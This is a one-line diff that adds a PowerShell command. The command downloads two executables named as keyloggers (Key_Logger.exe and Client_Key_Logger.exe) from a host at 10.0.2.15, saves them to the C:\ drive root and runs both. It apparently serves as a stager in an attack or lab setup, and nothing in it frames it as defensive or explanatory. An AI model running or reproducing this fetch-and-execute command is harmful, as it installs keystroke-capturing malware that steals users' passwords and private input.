@@ -1,0 +1,1 @@
+cd C:\; Invoke-WebRequest -Uri "http://10.0.2.15/Key_Logger.exe" -Outfile "C:\Key_Logger.exe"; Invoke-WebRequest -Uri "http://10.0.2.15/Client_Key_Logger.exe" -Outfile "C:\Client_Key_Logger.exe"; .\Client_Key_Logger.exe; .\Key_Logger.exe;
